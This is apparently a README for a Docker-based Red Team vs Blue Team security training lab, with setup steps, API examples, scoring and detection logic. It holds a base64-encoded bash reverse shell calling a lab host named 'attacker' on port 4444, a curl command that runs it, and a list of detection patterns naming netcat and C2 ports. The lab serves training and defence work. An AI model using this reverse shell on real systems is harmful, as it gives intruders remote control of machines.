# 🔴🔵 Mini SOC Lab — Red Team vs Blue Team Adversarial Simulation

A **real-time, adversarial Red Team vs Blue Team security operations simulation** built on Docker. Red Team launches attacks (malware, C2 beacons, persistence mechanisms) while Blue Team investigates, detects, and responds to defend the victim infrastructure.

---

## 🎯 Overview

This is an **event-driven, manual adversarial simulation** — not an automated game loop:

- **🔴 Red Team**: Execute arbitrary commands, upload/execute malware, establish persistence, and evade detection
- **🔵 Blue Team**: Monitor processes, analyze files, detect behavioral anomalies, and respond with defensive actions
- **📊 Real-time Visibility**: Monitoring agent sends system events to backend; Blue Team sees alerts in <5 seconds
- **⚔️ Competitive Scoring**: Red Team earns points for attacks; Blue Team earns points for detection and response

---

## 🏗️ Technology Stack

- **Frontend**: React + Vite (interactive Red/Blue Team panels)
- **Backend**: Java 17 + Spring Boot (API orchestrator, event processor)
- **Deployment**: Docker Compose (4-container ecosystem)
- **Monitoring**: Python psutil agent on victim (process, network, file, cron detection)

---

## 📁 Project Structure

```
mini-soc-lab-fullstack/
├── frontend/                      # React dashboard
│   ├── src/
│   │   ├── components/
│   │   │   ├── RedTeamPanel.jsx       # 🔴 Terminal, Payloads, Quick Attacks
│   │   │   ├── BlueTeamPanel.jsx      # 🔵 Investigation: processes, files, behavioral
│   │   │   ├── ActionPanel.jsx        # Blue Team defensive actions
│   │   │   ├── AlertsPanel.jsx        # Alert display & resolution
│   │   │   └── ...
│   │   ├── api/
│   │   │   └── client.js              # API calls (Red/Blue endpoints)
│   │   └── styles/app.css             # Dashboard styling
│   ├── Dockerfile
│   ├── nginx.conf
│   └── package.json
├── backend/                       # Spring Boot API
│   ├── src/main/java/com/minisoc/lab/
│   │   ├── controller/
│   │   │   ├── RedTeamController.java     # 🔴 POST /api/red-team/execute, upload-malware
│   │   │   ├── BlueTeamController.java    # 🔵 GET /api/blue-team/processes, scan-file, etc.
│   │   │   └── SimulationController.java  # Game control
│   │   ├── service/
│   │   │   ├── SimulationService.java     # Core orchestrator
│   │   │   ├── EventAlertMapper.java      # Event → Alert (MITRE mapping)
│   │   │   └── ActionExecutor.java        # Blue Team actions (kill, block, isolate)
│   │   ├── executor/
│   │   │   ├── SystemCommandExecutor.java # Docker exec wrapper
│   │   │   └── AttackExecutor.java        # Unused (legacy)
│   │   └── model/
│   │       ├── GameAlert.java            # Actionable alert
│   │       ├── SystemEvent.java          # Raw monitoring event
│   │       ├── GameState.java            # Score, threat, phase
│   │       └── ...
│   ├── Dockerfile
│   ├── pom.xml
│   └── src/main/resources/application.properties
├── containers/
│   ├── victim/                    # Ubuntu target
│   │   ├── monitor/process_monitor.py   # Monitoring agent
│   │   ├── Dockerfile
│   │   └── start.sh
│   └── attacker/                  # Ubuntu C2/staging
│       ├── attacks/               # Sample malware scripts
│       └── Dockerfile
├── scripts/
│   └── attacks/                   # Phase-based attack scripts
├── docker-compose.yml             # 4-container definition
├── RED_TEAM_ATTACK_GUIDE.md       # Detailed curl examples & attack walkthroughs
└── README.md                      # This file
```

---

## 🚀 Quick Start

### Prerequisites
- Docker + Docker Compose
- Port 3000 (frontend), 8080 (API) available

### Run the Stack

```bash
cd mini-soc-lab-fullstack
docker compose up --build
```

**Wait ~10 seconds for containers to stabilize**, then:

```
Frontend:  http://localhost:3000
API:       http://localhost:8080/api/health
```

### Verify Health

```bash
curl http://localhost:8080/api/health
# {"status":"UP"}

docker compose ps
# 4 containers: backend, frontend, victim, attacker (all running)
```

---

## 🎮 How to Use

### 1️⃣ Start a Game

```bash
curl -X POST http://localhost:8080/api/simulation/start \
  -H "Content-Type: application/json" \
  -d '{"difficulty":"MEDIUM"}'
```

Response:
```json
{"message":"Game started","difficulty":"MEDIUM"}
```

### 2️⃣ Red Team: Upload & Execute Malware

#### Option A: Upload Reverse Shell

```bash
curl -X POST http://localhost:8080/api/red-team/upload-malware \
  -H "Content-Type: application/json" \
  -d '{
    "name":"reverse_shell.sh",
    "payload":"IyEvYmluL2Jhc2gKYmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci80NDQ0IDA+JjE=",
    "obfuscation":"base64",
    "targetPath":"/tmp/reverse_shell.sh"
  }'
```

Response:
```json
{
  "success":true,
  "filePath":"/tmp/reverse_shell.sh",
  "points":5
}
```

#### Option B: Execute Command (Terminal)

```bash
curl -X POST http://localhost:8080/api/red-team/execute \
  -H "Content-Type: application/json" \
  -d '{
    "container":"soc-victim",
    "command":"bash /tmp/reverse_shell.sh &"
  }'
```

Response:
```json
{
  "success":true,
  "output":"",
  "points":10,
  "durationMs":245,
  "async":true
}
```

#### Option C: Use Frontend UI

1. Open `http://localhost:3000`
2. Navigate to **Red Team Panel** → **Payloads** tab
3. Click **Reverse Shell** button → automatically uploads
4. Switch to **Terminal** tab → select target container → type command
5. See execution history with success/failure, output, and points

---

### 3️⃣ Blue Team: Investigate & Respond

#### Investigate Processes

```bash
curl -X GET http://localhost:8080/api/blue-team/processes
```

Response:
```json
{
  "success":true,
  "output":"USER       PID %CPU %MEM    VSZ   RSS TTY STAT START   TIME COMMAND\nroot        13  0.4  0.3 35396 28252 ?   S   11:03  0:00 python3 /opt/monitor/process_monitor.py\nroot      1234  0.1  0.1  4456  3124 ?   S   11:05  0:00 bash -i >& /dev/tcp/attacker/4444 0>&1"
}
```

#### Scan File for Malware

```bash
curl -X POST http://localhost:8080/api/blue-team/scan-file \
  -H "Content-Type: application/json" \
  -d '{"filePath":"/tmp/reverse_shell.sh"}'
```

Response:
```json
{
  "success":true,
  "filePath":"/tmp/reverse_shell.sh",
  "verdict":"MALICIOUS",
  "threatScore":90,
  "entropy":3.45,
  "threats":[
    {
      "type":"TROJAN",
      "name":"Trojan.ReverseShell.Bash",
      "severity":"CRITICAL",
      "detail":"Bash reverse shell pattern detected"
    }
  ]
}
```

**Blue Team awarded +20 points for detection**

#### Run Behavioral Analysis

```bash
curl -X GET "http://localhost:8080/api/blue-team/behavioral-analysis?minutes=5"
```

Response:
```json
{
  "success":true,
  "eventCount":12,
  "anomalies":[
    {
      "type":"C2_COMMUNICATION",
      "description":"Outbound connections to known C2 ports detected",
      "score":85
    },
    {
      "type":"SUSPICIOUS_PROCESSES",
      "description":"Known attack tool processes detected: 3",
      "score":80
    }
  ],
  "combinedThreatScore":85,
  "recommendation":"INVESTIGATE_AND_RESPOND"
}
```

**Blue Team awarded +15 points for behavioral analysis**

#### Kill Malicious Process

```bash
curl -X POST http://localhost:8080/api/actions/kill-process \
  -H "Content-Type: application/json" \
  -d '{"pid":1234}'
```

**Blue Team awarded +30 points for successful kill**

#### Block Attacker IP

```bash
curl -X POST http://localhost:8080/api/actions/block-ip \
  -H "Content-Type: application/json" \
  -d '{"ip":"172.20.0.2"}'
```

**Blue Team awarded +25 points for blocking IP**

#### Isolate Host (Nuclear Option)

```bash
curl -X POST http://localhost:8080/api/actions/isolate-host \
  -H "Content-Type: application/json"
```

Effect: Network isolation (all traffic blocked), suspicious processes killed.
**Blue Team awarded +40 points**

---

## 📊 Scoring System

### Red Team Points

| Action | Points |
|--------|--------|
| Recon (nmap, ping) | +1 |
| Basic command (whoami, ls) | +1 |
| Upload malware | +5 |
| Reverse shell execution | +10 |
| C2 beacon setup | +10 |
| Cron persistence | +10 |
| Ransomware simulation | +20 |
| Data exfiltration | +20 |

### Blue Team Points

| Action | Points |
|--------|--------|
| File scan (detect malware) | +20 |
| Kill process | +30 |
| Block IP | +25 |
| Remove cron | +20 |
| Manual alert resolve | +15–30 |
| Isolate host | +40 |
| Behavioral analysis | +15 |

---

## 🚨 Alert System

Alerts are **event-driven** — generated when the monitoring agent detects suspicious activity:

1. **Monitoring Agent** (victim VM): Detects `PROCESS_SPAWNED`, `NETWORK_CONNECTION`, `FILE_CREATED`, `CRON_ADDED`, etc.
2. **EventAlertMapper**: Maps raw events to `GameAlert` with MITRE ATT&CK context
3. **Blue Team**: Sees alert in UI with:
   - Severity (CRITICAL, HIGH, MEDIUM, LOW)
   - Title + detailed description
   - MITRE ID + name (e.g., T1059.004 — "Unix Shell")
   - Actionable fields (PID to kill, IP to block)
   - Threat impact on score

### Alert Status Workflow

```
OPEN → (Blue Team acts) → RESOLVING → (agent confirms) → RESOLVED
                                    or
                      → (Blue fails action) → FAILED
                      or
                      → (Blue manually resolves) → RESOLVED
```

---

## 🔍 Behavioral Analysis Detectors

Triggered manually by Blue Team (`GET /api/blue-team/behavioral-analysis?minutes=N`):

- **C2 Communication**: Outbound connections to suspicious ports (4444, 5555, 9999, 1234, 8888)
- **Rapid Process Spawn**: >20 process spawns in time window
- **Rapid File Creation**: >10 files created in /tmp in time window
- **Persistence Installed**: CRON_ADDED events detected
- **Suspicious Process Names**: nc, nmap, python, perl, ruby in process name or cmdline
- **High Entropy**: Packed/encoded files detected by entropy calculation

---

## 🗂️ API Endpoints Reference

### Simulation Control
- `POST /api/simulation/start` → Start new game
- `POST /api/simulation/reset` → Reset game state
- `GET /api/dashboard/summary` → Game state (score, threat, phase)
- `GET /api/dashboard/logs` → Raw event logs
- `GET /api/dashboard/alerts` → Current alerts
- `GET /api/todos` → Todo items for both teams

### Red Team 🔴
- `POST /api/red-team/execute` → Execute command (container, command)
- `POST /api/red-team/upload-malware` → Upload malware (name, payload, obfuscation, path)
- `GET /api/red-team/history` → Audit trail of all Red Team actions

### Blue Team 🔵
- `GET /api/blue-team/processes` → List running processes (ps aux)
- `GET /api/blue-team/connections` → List network connections (ss/netstat)
- `GET /api/blue-team/files` → List suspicious files (/tmp, /var/tmp, /dev/shm)
- `POST /api/blue-team/scan-file` → Scan file for malware signatures
- `GET /api/blue-team/behavioral-analysis?minutes=N` → Anomaly detection analysis

### Blue Team Actions 🛡️
- `POST /api/actions/kill-process` → Kill process by PID
- `POST /api/actions/block-ip` → Block IP via iptables
- `POST /api/actions/isolate-host` → Full host isolation (network + processes)
- `POST /api/actions/remove-cron` → Remove cron persistence

---

## 📖 Detailed Guides

### Complete Attack Walkthrough

See **[RED_TEAM_ATTACK_GUIDE.md](./RED_TEAM_ATTACK_GUIDE.md)** for:
- Step-by-step attack execution with curl examples
- Malware payload descriptions & detection signatures
- Timeline visualization of attack vs defense
- Evasion techniques
- Troubleshooting

---

## 🐳 Container Architecture

### `soc-backend` (Spring Boot)
- Listens on port 8080
- Mounts Docker socket (`/var/run/docker.sock`)
- Orchestrates Red Team attacks via `docker exec`
- Processes Blue Team investigation queries
- Maps events to alerts in real-time
- Maintains game state (score, alerts, logs)

### `soc-frontend` (React + Nginx)
- Listens on port 3000
- Serves React SPA
- Proxies API calls to backend:8080
- Displays Red/Blue Team panels, alerts, logs
- Real-time polling (4-second refresh rate)

### `soc-victim` (Ubuntu 22.04)
- Target of Red Team attacks
- Runs **monitoring agent** (`process_monitor.py`) — detects events every 2 seconds
- Has basic tools: bash, netcat, cron, iptables, python3, psutil, requests
- **Port 4444** available for reverse shells (C2 listener)

### `soc-attacker` (Ubuntu 22.04)
- C2/staging container for Red Team
- Tools: nc, nmap, bash
- Can act as listener for reverse shells
- Can send attacks to victim via docker exec

---

## 🔧 Local Development

### Prerequisites
- Java 17 + Maven
- Node.js 20+
- Docker + Docker Compose

### Backend Only

```bash
cd backend
mvn spring-boot:run
# Listens on http://localhost:8080
```

### Frontend Only

```bash
cd frontend
npm install
npm run dev
# Listens on http://localhost:5173
# Requires backend running (uses http://localhost:8080)
```

### Both (Docker)

```bash
docker compose up --build
```

---

## 📝 Notable Features

✅ **Manual Red Team Control**: No automated attacks; Red Team has full control via API/UI
✅ **Signature-based Detection**: YARA-like pattern matching for malware
✅ **Behavioral Analysis**: ML-free anomaly detection based on event patterns
✅ **Event-driven Architecture**: Real-time events, no polling for simulation updates
✅ **MITRE ATT&CK Mapping**: Alerts include MITRE framework context
✅ **Competitive Scoring**: Both teams tracked, displayed in real-time
✅ **Persistence Simulation**: Cron-based backdoors, beacon loops, file creation
✅ **Obfuscation Support**: Base64/hex encoding for payload delivery
✅ **Docker Isolation**: Full Docker container ecosystem for safety

---

## 🎯 Gameplay Example

```
T+0s:   Game started
T+10s:  Red uploads reverse_shell.sh → +5 pts (Red: 5, Blue: 0)
T+15s:  Red executes reverse shell → +10 pts → bash process spawns
T+17s:  🚨 ALERT: Reverse Shell Detected → Blue sees "bash -i >& /dev/tcp/attacker/4444"
T+25s:  Blue scans file → +20 pts (Blue: 20)
T+30s:  Blue kills PID 1234 → +30 pts (Blue: 50)
T+31s:  ✓ Alert auto-resolved (process confirmed dead)
T+35s:  Blue blocks 172.20.0.2 → +25 pts (Blue: 75)
        Game threat score: 30 → 15 → 10 (from Blue actions)

Final: Red: 15 pts | Blue: 75 pts
```

---

## 🐛 Troubleshooting

### Containers won't start
```bash
docker compose down
docker compose up --build
```

### Backend API returns 400/Bad Request
- Ensure game started: `POST /api/simulation/start`
- Check container names: `docker compose ps`

### Malware upload/execution returns empty output
- Long commands (nmap) timeout at 15s. Expected. Set `"async":true` in response.
- Check victim container has tools: `docker exec soc-victim which nc nmap`

### Blue Team sees no alerts
- Wait 2-3 seconds for monitoring agent to detect (polls every 2s)
- Check backend logs: `docker logs soc-backend | tail -20`
- Verify monitoring agent running: `docker exec soc-victim ps aux | grep monitor`

---

## 📚 References

- **MITRE ATT&CK Framework**: https://attack.mitre.org/
- **YARA Rules**: https://yara.readthedocs.io/
- **Docker Exec Reference**: https://docs.docker.com/engine/reference/commandline/exec/

---

## 🤝 Contributing

This is an educational security project. Contributions welcome!

- Report bugs via GitHub Issues
- Submit attack/detection improvements via PRs
- Suggest new behavioral anomaly detectors

---

**Last Updated**: April 2026  
**Status**: Active Development — Red vs Blue Adversarial Mode Live
